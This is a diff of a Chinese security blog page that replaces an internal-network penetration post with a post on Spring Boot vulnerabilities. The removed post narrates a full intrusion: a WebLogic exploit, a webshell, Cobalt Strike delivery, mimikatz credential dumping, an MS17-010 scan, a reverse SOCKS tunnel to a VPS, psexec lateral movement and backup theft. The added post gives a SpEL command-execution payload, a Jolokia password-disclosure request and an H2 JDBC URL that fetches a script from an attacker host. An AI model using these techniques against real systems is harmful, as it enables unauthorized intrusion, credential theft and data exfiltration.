@@ -21,27 +21,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Windows常用搜集命令：   ipconfig &#x2F;all 查询网络配置信息    systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本” 查询操作系统版本-中文   systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version” 查询操作系统版本-英文">
+    <meta name="description" content="一、Spring Boot基础与安全机制1. Spring Boot定义 核心定位：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（@EnableAutoConfiguration）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。 关键特性： 无XML配置，通过spring-boot-starter-*依">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网信息搜集">
-<meta property="og:url" content="http://example.com/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
+<meta property="og:title" content="spring-boot详解">
+<meta property="og:url" content="http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/index.html">
 <meta property="og:site_name" content="乌篷船的博客">
-<meta property="og:description" content="Windows常用搜集命令：   ipconfig &#x2F;all 查询网络配置信息    systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本” 查询操作系统版本-中文   systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version” 查询操作系统版本-英文">
+<meta property="og:description" content="一、Spring Boot基础与安全机制1. Spring Boot定义 核心定位：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（@EnableAutoConfiguration）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。 关键特性： 无XML配置，通过spring-boot-starter-*依">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-04-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-04-29T03:09:32.299Z">
+<meta property="article:published_time" content="2025-06-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-06T02:15:16.987Z">
 <meta property="article:author" content="乌篷船">
-<meta property="article:tag" content="Computer-info">
+<meta property="article:tag" content="article">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+<link rel="canonical" href="http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","path":"2025/04/23/内网信息搜集/","title":"内网信息搜集"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/","path":"2025/06/06/spring-boot详解/","title":"spring-boot详解"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>内网信息搜集 | 乌篷船的博客</title>
+<title>spring-boot详解 | 乌篷船的博客</title>
   
 
 
@@ -140,7 +140,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows%E5%B8%B8%E7%94%A8%E6%90%9C%E9%9B%86%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">Windows常用搜集命令：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LINUX%E5%B8%B8%E7%94%A8%E6%90%9C%E9%9B%86%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">LINUX常用搜集命令：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%A0%81%E7%9A%84%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">内存码的注入：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">完整的内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E7%95%A5%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">简略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86"><span class="nav-number">4.2.</span> <span class="nav-text">详细</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E9%A1%B9%E7%9B%AE%EF%BC%9A"><span class="nav-number">4.3.</span> <span class="nav-text">免杀项目：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E5%AF%B9%E6%8A%80%E5%B7%A7%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">应对技巧：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">默认口令：</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81Spring-Boot%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">一、Spring Boot基础与安全机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Spring-Boot%E5%AE%9A%E4%B9%89"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">1. Spring Boot定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E7%BC%BA%E9%99%B7"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">2. 安全机制缺陷</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Spring-Boot%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.0.1.</span> <span class="nav-text">二、Spring Boot历史漏洞详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%B1%BB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">1. 信息泄露类漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">2. 远程代码执行（RCE）漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%BB%91%E7%9B%92%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%A3%80%E6%9F%A5%E6%B8%85%E5%8D%95"><span class="nav-number">1.0.2.</span> <span class="nav-text">三、黑盒安全评估检查清单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%B7%AF%E7%94%B1%E6%8E%A2%E6%B5%8B%E4%B8%8E%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">1. 路由探测与版本识别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%95%8F%E6%84%9F%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">2. 敏感端点检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">3. 漏洞利用验证流程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.0.3.</span> <span class="nav-text">四、防御建议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90"><span class="nav-number">1.0.4.</span> <span class="nav-text">五、学习资源</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#heapdump-tool"><span class="nav-number">1.0.4.0.0.1.</span> <span class="nav-text">heapdump_tool</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SpringBoot-Scan"><span class="nav-number">1.0.4.0.0.2.</span> <span class="nav-text">SpringBoot-Scan</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Swagger-API-Exploit"><span class="nav-number">1.0.4.0.0.3.</span> <span class="nav-text">Swagger API Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -210,7 +210,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -223,12 +223,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="内网信息搜集 | 乌篷船的博客">
+      <meta itemprop="name" content="spring-boot详解 | 乌篷船的博客">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          内网信息搜集
+          spring-boot详解
         </h1>
 
         <div class="post-meta-container">
@@ -238,15 +238,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2025-04-23 00:00:00" itemprop="dateCreated datePublished" datetime="2025-04-23T00:00:00+08:00">2025-04-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-04-29 11:09:32" itemprop="dateModified" datetime="2025-04-29T11:09:32+08:00">2025-04-29</time>
+      <time title="创建时间：2025-06-06 00:00:00 / 修改时间：10:15:16" itemprop="dateCreated datePublished" datetime="2025-06-06T00:00:00+08:00">2025-06-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -265,14 +259,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>4.7k</span>
+      <span>2.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>9 分钟</span>
+      <span>5 分钟</span>
     </span>
 </div>
 
@@ -282,252 +276,192 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="Windows常用搜集命令："><a href="#Windows常用搜集命令：" class="headerlink" title="Windows常用搜集命令："></a>Windows常用搜集命令：</h1><table>
-<thead>
-<tr>
-<th align="left"><code>ipconfig /all</code></th>
-<th>查询网络配置信息</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</td>
-<td>查询操作系统版本-中文</td>
-</tr>
-<tr>
-<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”</td>
-<td>查询操作系统版本-英文</td>
-</tr>
-<tr>
-<td align="left">echo %PROCESSOR_ARCHITECTURE%</td>
-<td>查看系统体系结构</td>
-</tr>
-<tr>
-<td align="left">wmic product get name,version</td>
-<td>安装软件版本信息</td>
-</tr>
-<tr>
-<td align="left">powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,version”</td>
-<td>收集软件版本信息</td>
-</tr>
-<tr>
-<td align="left">wmic service list brief</td>
-<td>查询本机服务信息</td>
-</tr>
-<tr>
-<td align="left"><code>tasklist /svc</code></td>
-<td>查询进程列表信息</td>
-</tr>
-<tr>
-<td align="left">wmic startup get command,caption</td>
-<td>查看启动程序信息</td>
-</tr>
-<tr>
-<td align="left">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
-<td>查看计划任务信息</td>
-</tr>
-<tr>
-<td align="left">net statistics workstation</td>
-<td>查看主机开机时间</td>
-</tr>
-<tr>
-<td align="left">net user</td>
-<td>查询用户列表信息</td>
-</tr>
-<tr>
-<td align="left">net localgroup administrators</td>
-<td>获取本地管理员（通常含有域用户）</td>
-</tr>
-<tr>
-<td align="left">query user || qwinsta</td>
-<td>查看当前在线用户信息</td>
-</tr>
-<tr>
-<td align="left">net session</td>
-<td>查客户端会话信息(管理员权限)</td>
-</tr>
-<tr>
-<td align="left"><code>netstat -ano</code></td>
-<td>查询端口列表信息</td>
-</tr>
-<tr>
-<td align="left"><code>Systeminfo</code></td>
-<td>查询补丁列表信息</td>
-</tr>
-<tr>
-<td align="left">wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
-<td>wmic来识别安装在系统中的补丁</td>
-</tr>
-<tr>
-<td align="left"><code>net share</code></td>
-<td>查看本机共享信息</td>
-</tr>
-</tbody></table>
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<h1 id="一、Spring-Boot基础与安全机制"><a href="#一、Spring-Boot基础与安全机制" class="headerlink" title="一、Spring Boot基础与安全机制"></a><strong>一、Spring Boot基础与安全机制</strong></h1><h4 id="1-Spring-Boot定义"><a href="#1-Spring-Boot定义" class="headerlink" title="1. Spring Boot定义"></a>1. <strong>Spring Boot定义</strong></h4><ul>
+<li><strong>核心定位</strong>：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（<code>@EnableAutoConfiguration</code>）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。</li>
+<li><strong>关键特性</strong>：<ul>
+<li>无XML配置，通过<code>spring-boot-starter-*</code>依赖自动装配组件。</li>
+<li>Actuator模块提供生产环境监控端点（如<code>/env</code>、<code>/health</code>），默认暴露敏感信息。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-安全机制缺陷"><a href="#2-安全机制缺陷" class="headerlink" title="2. 安全机制缺陷"></a>2. <strong>安全机制缺陷</strong></h4><ul>
+<li><strong>默认暴露路由</strong>：Actuator端点未授权访问导致信息泄露。</li>
+<li><strong>配置不当</strong>：开发环境配置误用于生产环境（如Swagger、Actuator未关闭）。</li>
+<li><strong>依赖链风险</strong>：第三方库（如SnakeYAML、XStream）的反序列化漏洞被利用。</li>
+</ul>
 <span id="more"></span>
 
-<h1 id="LINUX常用搜集命令："><a href="#LINUX常用搜集命令：" class="headerlink" title="LINUX常用搜集命令："></a>LINUX常用搜集命令：</h1><table>
+<hr>
+<h3 id="二、Spring-Boot历史漏洞详解"><a href="#二、Spring-Boot历史漏洞详解" class="headerlink" title="二、Spring Boot历史漏洞详解"></a><strong>二、Spring Boot历史漏洞详解</strong></h3><h4 id="1-信息泄露类漏洞"><a href="#1-信息泄露类漏洞" class="headerlink" title="1. 信息泄露类漏洞"></a>1. <strong>信息泄露类漏洞</strong></h4><ul>
+<li><strong>敏感数据暴露</strong><ul>
+<li><p><strong>漏洞路径</strong>：<code>/env</code>、<code>/actuator/env</code> 泄露环境变量、数据库密码（部分脱敏字段可被绕过）16。</p>
+</li>
+<li><p><strong>脱敏绕过</strong>：通过Jolokia接口调用MBean获取星号（<code>******</code>）遮掩的密码明文：</p>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;</span>, <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;getProperty&quot;</span>, <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;security.user.password&quot;</span>]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>接口详情泄露</strong><ul>
+<li><strong>Swagger路由</strong>：<code>/v2/api-docs</code>、<code>/swagger-ui.html</code> 暴露API文档及参数。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-远程代码执行（RCE）漏洞"><a href="#2-远程代码执行（RCE）漏洞" class="headerlink" title="2. 远程代码执行（RCE）漏洞"></a>2. <strong>远程代码执行（RCE）漏洞</strong></h4><p>以下是12类核心RCE漏洞的对比与利用要点：</p>
+<table>
 <thead>
 <tr>
-<th><code>ifconfig -a</code> 或 <code>ip a</code></th>
-<th>查询网络配置信息</th>
+<th align="left"><strong>漏洞名称</strong></th>
+<th align="left"><strong>利用条件</strong></th>
+<th align="left"><strong>利用方法</strong></th>
+<th align="left"><strong>关键路径</strong></th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>uname -a</code></td>
-<td>查询系统内核及版本信息</td>
+<td align="left"><strong>Whitelabel Error Page SpEL</strong></td>
+<td align="left">Spring Boot 1.1.0-1.3.0</td>
+<td align="left">注入SpEL表达式：<code>$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)&#125;</code></td>
+<td align="left">触发错误页面的参数（如<code>?id=</code>)</td>
 </tr>
 <tr>
-<td><code>cat /etc/os-release</code> 或 <code>lsb_release -a</code></td>
-<td>查询操作系统版本信息</td>
+<td align="left"><strong>Spring Cloud SnakeYAML RCE</strong></td>
+<td align="left">依赖<code>spring-cloud-starter</code></td>
+<td align="left">设置<code>spring.cloud.bootstrap.location</code>指向恶意YAML文件</td>
+<td align="left"><code>/env</code> + <code>/refresh</code></td>
 </tr>
 <tr>
-<td><code>arch</code> 或 <code>uname -m</code></td>
-<td>查看系统体系结构</td>
+<td align="left"><strong>Eureka XStream反序列化</strong></td>
+<td align="left">使用Eureka服务发现</td>
+<td align="left">修改<code>eureka.client.serviceUrl.defaultZone</code>指向恶意XStream Payload</td>
+<td align="left"><code>/env</code> + <code>/refresh</code></td>
 </tr>
 <tr>
-<td><code>dpkg -l</code> (Debian&#x2F;Ubuntu) 或 <code>rpm -qa</code> (RHEL&#x2F;CentOS)</td>
-<td>安装软件版本信息</td>
+<td align="left"><strong>Jolokia Logback JNDI</strong></td>
+<td align="left">Jolokia端点开放 + Logback依赖</td>
+<td align="left">通过<code>ch.qos.logback.classic.jmx.JMXConfigurator</code>加载远程恶意XML</td>
+<td align="left"><code>/jolokia</code> + <code>POST</code>请求</td>
 </tr>
 <tr>
-<td><code>service --status-all</code> 或 <code>systemctl list-units --type=service</code></td>
-<td>查询本机服务信息</td>
+<td align="left"><strong>H2 Database Console JNDI</strong></td>
+<td align="left">启用H2 Console（默认<code>/h2-console</code>）</td>
+<td align="left">利用JDBC URL触发JNDI注入：<code>jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3/;INIT=RUNSCRIPT FROM &#39;http://attacker/exp.sql&#39;</code></td>
+<td align="left"><code>/h2-console</code>登录后的JDBC执行点</td>
 </tr>
 <tr>
-<td><code>ps aux</code></td>
-<td>查询进程列表信息</td>
-</tr>
-<tr>
-<td><code>ls /etc/init.d/</code> 或 <code>ls /etc/systemd/system/</code></td>
-<td>查看启动程序信息</td>
-</tr>
-<tr>
-<td><code>crontab -l</code> 或 <code>ls /etc/cron.*</code></td>
-<td>查看计划任务信息</td>
-</tr>
-<tr>
-<td><code>uptime</code></td>
-<td>查看主机运行时间</td>
-</tr>
-<tr>
-<td><code>cat /etc/passwd</code></td>
-<td>查询用户列表信息</td>
-</tr>
-<tr>
-<td><code>cat /etc/group</code></td>
-<td>获取用户组信息（包括管理员组）</td>
-</tr>
-<tr>
-<td><code>who</code> 或 <code>w</code></td>
-<td>查看当前在线用户信息</td>
-</tr>
-<tr>
-<td><code>netstat -antp</code> 或 <code>ss -tulnp</code></td>
-<td>查询端口列表信息</td>
-</tr>
-<tr>
-<td><code>apt list --installed</code> (Debian&#x2F;Ubuntu) 或 <code>yum list installed</code> (RHEL&#x2F;CentOS)</td>
-<td>查询已安装软件包（包含部分补丁信息）</td>
-</tr>
-<tr>
-<td><code>ls /mnt/</code> 或 <code>mount</code></td>
-<td>查看挂载的共享信息</td>
-</tr>
-<tr>
-<td><code>df -h</code></td>
-<td>查看磁盘使用情况</td>
-</tr>
-<tr>
-<td><code>free -h</code></td>
-<td>查看内存使用情况</td>
-</tr>
-<tr>
-<td><code>lscpu</code></td>
-<td>查看CPU信息</td>
-</tr>
-<tr>
-<td><code>dmidecode -t system</code></td>
-<td>查看系统硬件信息（需要root权限）</td>
-</tr>
-<tr>
-<td><code>journalctl -u &lt;service_name&gt;</code></td>
-<td>查看特定服务的日志信息</td>
-</tr>
-<tr>
-<td><code>cat /etc/hosts</code></td>
-<td>查看主机名和IP映射</td>
-</tr>
-<tr>
-<td><code>hostnamectl</code></td>
-<td>查看主机名和系统信息</td>
+<td align="left"><strong>MySQL JDBC反序列化</strong></td>
+<td align="left">使用MySQL驱动 + 可外连</td>
+<td align="left">劫持JDBC连接至恶意MySQL服务器，发送Gadget链</td>
+<td align="left">修改<code>spring.datasource.url</code>属性</td>
 </tr>
 </tbody></table>
-<p>注：</p>
-<ol>
-<li>部分命令可能需要root权限才能获取完整信息（可在命令前加<code>sudo</code>）</li>
-<li>不同Linux发行版可能需要使用对应的包管理命令（apt&#x2F;yum&#x2F;dnf等）</li>
-<li>对于较新的系统，推荐使用<code>ip</code>替代<code>ifconfig</code>，使用<code>ss</code>替代<code>netstat</code></li>
-</ol>
-<h1 id="内存码的注入："><a href="#内存码的注入：" class="headerlink" title="内存码的注入："></a>内存码的注入：</h1><p>[内存马注入]: <a target="_blank" rel="noopener" href="https://github.com/pap1rman/JNDIExploit-modify">https://github.com/pap1rman/JNDIExploit-modify</a>	“参考如下：”</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Bypass">https://github.com/welk1n/JNDI-Injection-Bypass</a></li>
+<blockquote>
+<p>💡 <strong>利用链共性</strong>：多数RCE依赖Actuator的<code>/env</code>端点修改环境变量，并通过<code>/refresh</code>或<code>/restart</code>触发配置生效。</p>
+</blockquote>
+<hr>
+<h3 id="三、黑盒安全评估检查清单"><a href="#三、黑盒安全评估检查清单" class="headerlink" title="三、黑盒安全评估检查清单"></a><strong>三、黑盒安全评估检查清单</strong></h3><h4 id="1-路由探测与版本识别"><a href="#1-路由探测与版本识别" class="headerlink" title="1. 路由探测与版本识别"></a>1. <strong>路由探测与版本识别</strong></h4><ul>
+<li><strong>默认路由扫描</strong>：<ul>
+<li>Actuator 1.x根路径：<code>/env</code>、<code>/heapdump</code>。</li>
+<li>Actuator 2.x根路径：<code>/actuator/env</code>、<code>/actuator/heapdump</code>。</li>
+<li>自定义路径：尝试<code>/manage</code>、<code>/appenv</code>等常见替代路径。</li>
 </ul>
-<h1 id="完整的内网渗透"><a href="#完整的内网渗透" class="headerlink" title="完整的内网渗透"></a>完整的内网渗透</h1><h2 id="简略："><a href="#简略：" class="headerlink" title="简略："></a>简略：</h2><p>1.获取shell—无论是sql注入提权还是webshell还是直接ssh等，获取shell后</p>
-<p>2.cs上线—下载powershell等工具或者jar直接上线</p>
-<p>3.如上信息搜集，进行横向，域内横向，类似于操作1.直接找shell</p>
-<p>（3）.可以尝试<strong>sock代理</strong>，使同一网，进行msf的扫描，有的话就是捷径</p>
-<p>（3）.有备份的话可以直接拷贝<strong>全量备份</strong>，它能在你本地横？可以cmd覆盖</p>
-<p>（3）.<strong>基础操作</strong>：主机端口，内网web，系统&#x2F;框架漏洞</p>
-<p>(技巧)[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/category/1181220.html]">https://www.cnblogs.com/backlion/category/1181220.html]</a></p>
-<h2 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h2><p>1.通过fofa搜索到目标系统是采用weblogic框架，通过weblogic利用工具可执行命令，这里上传冰蝎一句话到目标网站系统。并查询到目标系统存在小众的防火墙，经测试该防火墙对ps脚本不拦截。</p>
-<p>2.在VPS上通过cd自带的Scripted Web Delivery模块，直接创建一个web服务用于一键下载和执行powershel。</p>
-<p>URL路径：&#x2F;a&#x2F;123   主机地址：目标系统IP   端口：80  监听器：https   类型：posershell</p>
-<p>3.执行powershel，然后CS成功上线。</p>
-<p>4.通过C命令查询目标系统信息,发现目标系统是win2012 ，目标内网IP为192.168.200.21</p>
-<p>shell systeminfo</p>
-<p>shell ipconfig</p>
-<p>5。通过cs将ladon上传到目标系统中，通过ladon扫描内网系统.,发现目标有一个WEB服务主机。</p>
-<p>landon 192.168.200.1&#x2F;24    OsScan</p>
-<p>6。通过mimikatz成功读取到用户名和密码hash值，通过md5对密码的NTML进行解密，成功解密为P@sssw0rd。</p>
-<p>7,通过ladon进行批量ms17-010扫描，发现存有几个系统存在ms17-010漏洞</p>
-<p>landon 192.168.200.1&#x2F;24 MS17010</p>
-<p>8.在公网VPS上执行以下命令，将1900端口收到的代理请求转交给反连1200端口的主机</p>
-<p>ew -s rcsocks -l 1900 -e 1200</p>
-<p>9.将ew通过冰蝎上传目标系统中，并执行以下命令,开启目标主机socks5服务并反向连接到中转机器的1200端口</p>
-<p>ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e 1200</p>
-<p>10.本地WINDOWS在本地使用sockscap配置好socke5代理，本地虚拟机里面的kali的MSF，kali的代理配置比较方便，先vim &#x2F;etc&#x2F;proxychains.conf ，添加sock5嗲了</p>
-<p>socks5  目标IP  1900</p>
-<p>11.在kali下msf要挂代理，就直接：proxychains msfconsole，在windows中sockscap添加ie浏览器访问的socks5代理，用于内网web访问，但是测试弱口令发现无法进入。</p>
-<p>12.继续信息收集，查看登录凭证，并有任何东西</p>
-<p>shell  cmdkey  &#x2F;l</p>
-<p>13.查看共享计算机列表，并尝试访问计算机C盘,发现备份计算机可以访问共享</p>
-<p>shell  ne  view</p>
-<p>ls   \VEEAM-BACKUP$</p>
-<p>14.通过ping目标共享计算机，查询出IP地址为192.168.200.6</p>
-<p>ping   VEEAM-BACKUP</p>
-<p>15.在CS上创建一个监听器</p>
-<p>中转—监听—名字（c2)、payload(windows&#x2F;beacon_reverse_tcp)、listen host :192.168.200.21  、listen port:4444</p>
-<p>16.接着使用psexec_psh尝试上线192.168.200.6这台服务器,成功上线，起初发现该主机上并没有任何东西</p>
-<p>jump  psexec _psh  192.168.200.6</p>
-<p>17.通过之前ladon探测发现内网中22,1,5,11主机是linux系统，尝试弱口令，发现192.168.200.22存在弱口令，linux主机上并没有任何可利用的</p>
-<p>ssh  192.168.200.22  root  123456</p>
-<p>18.在VEEAM-BACKUP主机上发现了有一个Backup的文件，里面存放了三个机器的备份，它是一款叫Veeam® Backup &amp; Replication的软件，他的功能是专门为Vsphere等做备份。</p>
-<p>19.发现VEEAM-BACKUP不出外网，这里通过7z将Backup文件进行命令打包压缩。在目标系统中的web目录下，通过命令共享将Backup文件拷贝到目标系统中。</p>
-<p>19.在本地安装Backup &amp; Replication，并将备份文件进行恢复还原，发现登录窗口处有默认的用户名和密码以及IP，这个需要在目标内网中登录，这里可以通过在目标系统中通过cs开启sock4代理，本地通过Proxifier加载Backup &amp; Replication的sock4代理成功访问。</p>
-<p>20.本地下载的那个全量备份在本地还原也很简单，只需要装了软件双击就回自动打开软件进行还原</p>
